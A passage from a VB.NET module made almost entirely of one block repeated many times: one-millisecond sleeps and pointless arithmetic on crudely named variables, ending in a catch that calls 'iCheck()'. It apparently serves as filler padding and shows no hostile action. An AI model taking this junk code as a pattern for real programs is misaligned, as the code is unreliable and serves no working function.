            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			catch
iCheck()
end try

end
End Sub
End Module